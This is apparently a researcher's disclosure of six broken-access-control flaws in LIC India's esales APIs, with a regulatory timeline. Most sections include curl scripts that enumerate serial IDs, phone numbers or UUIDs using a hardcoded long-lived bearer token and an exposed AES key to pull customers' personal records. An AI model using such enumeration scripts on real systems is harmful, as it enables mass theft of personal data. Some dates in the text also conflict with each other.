---
title: LIC cyber vulnerabilities and data breaches 2024-2025
date:
  created: 2025-08-11
  updated: 2025-08-11
---

The Life Insurance Corporation of India (LIC) had 6 vulnerabilities in October 2024, December 2024 and April 2025 in their <https://esales.licindia.in> website (developed by [iNube software solutions](https://inubesolutions.com/)). Two of them allowed serial access to policy forms of prospect customers containing  Name, DOB, email, phone, PAN card, income tax forms, aadhaar (or other IDs), signature, photo, medical history, address, income, nominees, other policy purchase details, etc.

The story was covered only in Medianama.

- [Medianama article by Sakshi Sadashiv K, 20 December 2024](https://www.medianama.com/2024/12/223-lic-delayed-action-security-warnings-esales-website-public-data/)

Summary of the vulnerabilities:

| Sr | API  | Date reported | Date fixed | Days taken | CERT-in reference number |
|----|------|---------------|------------|------------|--------------------------|
| 1  | [GenericDocumentViewer](#1-genericdocumentviewer)  | 16 October 2024 | 23 October 2024 | 7 | not assigned due to non-reproducibility (due to delay in reporting it to CERT after reporting it to LIC) |
| 2  | [GetPayLoadByQueryDynamic](#2-getpayloadbyquerydynamic) | 16 October 2024, 6 December 2024 | 5 February 2025 | 112, 52 | CERTIn-80801824 |
| 3  | [GetDocumentByIdPost](#3-getdocumentbyidpost) | 9 December 2024 | 28 January 2025 | 50 | CERTIn-80801824 |
| 4  | [GetUserByUserIdPost](#4-getuserbyuseridpost) | 9 December 2024 | 28 January 2025 | 50 | CERTIn-80801824 |
| 5  | [GenericSPApi](#5-genericspapi) | 9 December 2024 | 28 January 2025 | 50 | CERTIn-80801824 |
| 6  | [GetQuoteDetailByNumberPost](#6-getquotedetailbynumberpost) | 4 June 2025 | 25 July 2025 | 51 | CERTIn-38009725|

Root cause in [OWASP](https://cheatsheetseries.owasp.org/index.html) terms:

- A01 2021 Broken Access Control: CWE-35 Path Traversal, CWE-284 Improper Access Control, CWE-285 Improper Authorization
- A04 2021 Insecure Design: CWE-73 External Control of File Name or Path, Insecure Direct Object Reference
- A07 2021 Identification and Authentication Failures: CWE-287 Improper Authentication, CWE-613 Insufficient Session Expiration

<!-- more -->

### Outcome

After repeated PGportal complaints against LIC, [RTIs with LIC](../../rti/posts/lic.md), [RTIs with IRDAI](../../rti/posts/irdai.md) and mails to IRDAI executive directors:

- IRDAI reconstituted Reconstitution of Inter-Disciplinary Standing Committee on Cyber Security dated 05th Feb, 2025. IRDAI/GA&HR/GDL/MISC/33/02/2024

    <https://irdai.gov.in/document-detail?documentId=6678726>

- IRDAI's infosec issued a show cause notice to LIC on 18 February 2025.

    [RTIs with IRDAI](../../rti/posts/irdai.md)

- IRDAI issued a circular (after a gap of 18 months after the [last circular](https://irdai.gov.in/document-detail?documentId=6678726) and two years after the [2023 cybersecurity guidelines](https://irdai.gov.in/document-detail?documentId=3314780)) dated 24 March 2025 titled "Regarding Cyber Incident or Crisis Preparedness". IRDAI/GA&HR/CIR/MISC/49/03/2025

    <https://irdai.gov.in/document-detail?documentId=6975996>

- LIC issued a tender for cybersecurity training of its employees, dated 18 June 2025. CO-ERM-IT-CSD-2025-2026/IS Awareness.

    <https://licindia.in/tender-for-on-boarding-cyber-security-knowledge-partners-for-awareness-training-sessions-for-employees-agents-vendors-customers-and-other-stakeholders>

- IRDAI issued a penalty of ₹Three Crore Thirty-Nine Lakhs on M/S Star Health and Allied Insurance Co. Ltd. on 25 July 2025 "for various violations established under IRDAI Information & Cyber Security Guidelines, 2023".

    <https://irdai.gov.in/document-detail?documentId=7642959>

### 1. GenericDocumentViewer

This is it. One by one, all policy forms were accessible. A sample, redacted form is given at [sample proposal.pdf](content_lic/vuln1_sample_response.pdf)

Discovered and reported on 16th October 2024. ~~Fixed~~ covered up on 23th October 2024. The fix implemented was wholly incomplete as shown in the vulnerability 2 below. The underlying API still remained vulnerable to serial access.

```log
- https://esales.licindia.in/GenericDocumentViewer?DocId=24194_800210_MergedDocument.pdf
- https://esales.licindia.in/GenericDocumentViewer?DocId=24194_800211_MergedDocument.pdf
- https://esales.licindia.in/GenericDocumentViewer?DocId=24194_800212_MergedDocument.pdf
- https://esales.licindia.in/GenericDocumentViewer?DocId=24194_800213_MergedDocument.pdf
- https://esales.licindia.in/GenericDocumentViewer?DocId=24194_800214_MergedDocument.pdf
- https://esales.licindia.in/GenericDocumentViewer?DocId=24194_800215_MergedDocument.pdf
```

!!!note "Sample Response"
    [Open full proposal form](content_lic/vuln1_sample_response.pdf)

    ![Alt text](content_lic/vuln1_sample_response.pdf){ type=application/pdf }

### 2. GetPayLoadByQueryDynamic

Accepted phone number and provided email, DOB, proposal document number which can be used
in other APIs to get more data.

```bash title="sample_script.sh" linenums="1"
#!/bin/bash
for phone in "0000000000"
do
  timestamp=$(date '+%F_%T')
  curl -vvv -X POST 'https://digiapi.licindia.in/api/Report/GetPayLoadByQueryDynamic'\
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VySWQiOiI3M2M4MzJhNi03YzU1LTQzN2UtYjkyNy1hMzYwYTdhMDIxNzkiLCJFbWFpbCI6IkxJQ0RlbW9BZ2VudEBnbWFpbC5jb20iLCJPcmdJZCI6IjExMiIsIlBhcnRuZXJJZCI6IjAiLCJSb2xlIjoiTElDRGVtb0FnZW50IiwiTmFtZSI6IkxJQ0RlbW9BZ2VudCIsIlVzZXJOYW1lIjoiTElDRGVtb0FnZW50QGdtYWlsLmNvbSIsIlByb2R1Y3RUeXBlIjoiTWljYSIsIlNlcnZlclR5cGUiOiIxIiwiU2Vzc2lvbklkIjoiNjQyYjJhZDYtNjE3Yi00MjRkLThlOGItMWIzZTRjMWQwYWI2IiwiVGltZXpvbmVNaW4iOiIzMzAiLCJleHAiOjE4MjM4Njc0OTEsImlzcyI6IkludWJlIiwiYXVkIjoiSW51YmVNSUNBIn0.LvWId_MA3nHN9J-xw_ZDxfVHMPIa-sNbAQUn_w5LRxo'\
  -H 'appId: 642b2ad6-617b-424d-8e8b-1b3e4c1d0ab6'\
  -H 'TE: trailers' -d "{\"reportname\":\"TrackApplicationData\",\"paramList\":[{\"parameterName\":\"MobileNo\",\"parameterValue\":\"${phone}\"},{\"parameterName\":\"ChannelType\",\"parameterValue\":\"D2C\"}]}" \
  -o "getpayloadbyqueryd_${phone}_${timestamp}.json" ;
done
```

<details>
<summary>Sample response</summary>
```json linenums="1"
---8<--- "docs/vuln/posts/content_lic/lic_vuln_2.json"
```

</details>

### 3. GetDocumentByIdPost

This API accepted an encrypted document ID and returns the document. The encryption was done using AES-128-CBC with a static key and IV - exposed in the front-end code. The API was vulnerable to serial access as the document ID is an ever-increasing number, same as the vulnerability 1. The API response was a base64 encoded string which was decoded to get the document.

The bearer token, as visible on [jwt.io](https://jwt.io/), was valid for three years. Further, it was not tied to any user session and was used to access anyone's documents as long as the `SessionId` in the token was the same as the `appId` in headers (which is trivial).

Discovered and reported on 31 December 2024. Fixed on 19 February 2025.

```bash title="sample_script.sh" linenums="1"
#!/bin/bash
# Hexadecimal key exposed in the front-end code.
KEY="3539613231367a34394b336235384434"
# Hexadecimal IV exposed in the front-end code.
IV="756336394a4e353733683766366d6b36"

encrypt() {
  echo $(echo -n "$1" | openssl enc -e -aes-128-cbc -base64 -A -K "$KEY" -iv "$IV" -nosalt)
}

for opp_ids in "24194_800210_MergedDocument.pdf" "24194_800211_MergedDocument.pdf" ; do

  # The payload is the encrypted yet serial document ID.
  payload="{\"id\":\"$(encrypt "$opp_ids")\"}"

  # The appId header is a static value, same as the claim "SessionId" in the JWT token.
  # The Authorization header is a static value.
  curl -v -X POST 'https://digiapi.licindia.in/api/DMS/GetDocumentByIdPost' \
    -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VySWQiOiI3M2M4MzJhNi03YzU1LTQzN2UtYjkyNy1hMzYwYTdhMDIxNzkiLCJFbWFpbCI6IkxJQ0RlbW9BZ2VudEBnbWFpbC5jb20iLCJPcmdJZCI6IjExMiIsIlBhcnRuZXJJZCI6IjAiLCJSb2xlIjoiTElDRGVtb0FnZW50IiwiTmFtZSI6IkxJQ0RlbW9BZ2VudCIsIlVzZXJOYW1lIjoiTElDRGVtb0FnZW50QGdtYWlsLmNvbSIsIlByb2R1Y3RUeXBlIjoiTWljYSIsIlNlcnZlclR5cGUiOiIxIiwiU2Vzc2lvbklkIjoiNjQyYjJhZDYtNjE3Yi00MjRkLThlOGItMWIzZTRjMWQwYWI2IiwiVGltZXpvbmVNaW4iOiIzMzAiLCJleHAiOjE4MjM4Njc0OTEsImlzcyI6IkludWJlIiwiYXVkIjoiSW51YmVNSUNBIn0.LvWId_MA3nHN9J-xw_ZDxfVHMPIa-sNbAQUn_w5LRxo' \
    -H 'appId: 642b2ad6-617b-424d-8e8b-1b3e4c1d0ab6' \
    -d "${payload}" -o "getdocumentbyidpost_${opp_ids}.txt"

  # The response is a JSON object with a "data" field containing the base64 string
  awk -F'"' '/"data":/ {print $(4)}' "getdocumentbyidpost_${opp_ids}.txt" >"getdocumentbyidpost_${opp_ids}"
  # Extract the base64 encoded document from the response and decode it.
  base64 --decode "getdocumentbyidpost_${opp_ids}" >"getdocumentbyidpost_dec_${opp_ids}"

done
```

<details>
<summary>Sample response</summary>
```json linenums="1"
---8<--- "docs/vuln/posts/content_lic/lic_vuln_3.json"
```
</details>

### 4. GetUserByUserIdPost

Accepted a UUID user ID

```bash title="sample_script.sh" linenums="1"
#!/bin/bash
for id in '$$$$$$$$-$$$$-$$$$-$$$$-$$$$$$$$$$$$';
do
  curl 'https://digiapi.licindia.in/api/UserProfile/GetUserByUserIdPost' -X POST \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VySWQiOiI3M2M4MzJhNi03YzU1LTQzN2UtYjkyNy1hMzYwYTdhMDIxNzkiLCJFbWFpbCI6IkxJQ0RlbW9BZ2VudEBnbWFpbC5jb20iLCJPcmdJZCI6IjExMiIsIlBhcnRuZXJJZCI6IjAiLCJSb2xlIjoiTElDRGVtb0FnZW50IiwiTmFtZSI6IkxJQ0RlbW9BZ2VudCIsIlVzZXJOYW1lIjoiTElDRGVtb0FnZW50QGdtYWlsLmNvbSIsIlByb2R1Y3RUeXBlIjoiTWljYSIsIlNlcnZlclR5cGUiOiIxIiwiU2Vzc2lvbklkIjoiNjQyYjJhZDYtNjE3Yi00MjRkLThlOGItMWIzZTRjMWQwYWI2IiwiVGltZXpvbmVNaW4iOiIzMzAiLCJleHAiOjE4MjM4Njc0OTEsImlzcyI6IkludWJlIiwiYXVkIjoiSW51YmVNSUNBIn0.LvWId_MA3nHN9J-xw_ZDxfVHMPIa-sNbAQUn_w5LRxo' \
  -H 'appId: 642b2ad6-617b-424d-8e8b-1b3e4c1d0ab6' \
  --data-raw "{\"id\":\"$id\"}" \
  -o "getuserbyuseridpost_${id}.json" ;
  sleep 1
done
```

<details>
<summary>Sample response</summary>

```json linenums="1"
--8<-- "docs/vuln/posts/content_lic/lic_vuln_4.json"
```

</details>

### 5. GenericSPApi

Accepted a JSON payload with an encrypted `Application_ID`. The API returned a JSON object with the details of the proposal, including the proposer details, risk items, and channel details.

```bash title="sample_script.sh" linenums="1"
#!/bin/bash
for ((opp_ids=1252200; opp_ids<=1252210; opp_ids++)) ;
do
  payload="{\"Application_ID\":${opp_ids},\"KeyValues\":[{\"key\":\"$(encrypt "OpportunityId")\",\"value\":\"$(encrypt "${opp_ids}")\"},{\"key\":\"$(encrypt "Type")\",\"value\":\"$(encrypt "ACR")\"}]}"

  curl -f -X  POST 'https://digiapi.licindia.in/api/Product/GenericSPApi?ApiName=CommonDetailsForLifeProposal'\
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VySWQiOiI3M2M4MzJhNi03YzU1LTQzN2UtYjkyNy1hMzYwYTdhMDIxNzkiLCJFbWFpbCI6IkxJQ0RlbW9BZ2VudEBnbWFpbC5jb20iLCJPcmdJZCI6IjExMiIsIlBhcnRuZXJJZCI6IjAiLCJSb2xlIjoiTElDRGVtb0FnZW50IiwiTmFtZSI6IkxJQ0RlbW9BZ2VudCIsIlVzZXJOYW1lIjoiTElDRGVtb0FnZW50QGdtYWlsLmNvbSIsIlByb2R1Y3RUeXBlIjoiTWljYSIsIlNlcnZlclR5cGUiOiIxIiwiU2Vzc2lvbklkIjoiNjQyYjJhZDYtNjE3Yi00MjRkLThlOGItMWIzZTRjMWQwYWI2IiwiVGltZXpvbmVNaW4iOiIzMzAiLCJleHAiOjE4MjM4Njc0OTEsImlzcyI6IkludWJlIiwiYXVkIjoiSW51YmVNSUNBIn0.LvWId_MA3nHN9J-xw_ZDxfVHMPIa-sNbAQUn_w5LRxo' \
  -H 'appId: 642b2ad6-617b-424d-8e8b-1b3e4c1d0ab6' \
  -d "${payload}" -o generic_spapi_${opp_ids}.json
  sleep 1
 done
```

<details>
<summary>Sample response</summary>
```json linenums="1"
--8<-- "docs/vuln/posts/content_lic/lic_vuln_5.json"
```
</details>

### 6. GetQuoteDetailByNumberPost

This API allowed reading and modifying an ongoing proposal by its opportunityId GUID. The GUID can be obtained from browser history on a shared computer, or by social engineering/ phishing.

```text
https://esales.licindia.com/lifeCustomerProposals?OpportunityId=$$$$$$$$-$$$$-$$$$-$$$$-$$$$$$$$$$$$
https://esales.licindia.com/LifePostPayment?OpportunityId=$$$$$$$$-$$$$-$$$$-$$$$-$$$$$$$$$$$$
```

The underlying API and response is as follows.

```bash title="sample_script.sh" linenums="1"
#!/bin/bash
timestamp=$(date '+%F_%T')
curl 'https://digiapi.licindia.in/api/Quotation/GetQuoteDetailByNumberPost' \
  -X POST \
  -H 'Authorization: Bearer encrypted_JWT' \
  -H 'appId: $$$$$$$$-$$$$-$$$$-$$$$-$$$$$$$$$$$$' \
  --data-raw '{"QuoteNo":null,"GUID":"$$$$$$$$-$$$$-$$$$-$$$$-$$$$$$$$$$$$"}' \
  -o "output_${timestamp}.json"
```

<details>
<summary>Sample response</summary>

```json linenums="1"
--8<-- "docs/vuln/posts/content_lic/lic_vuln_6.json"
```

</details>
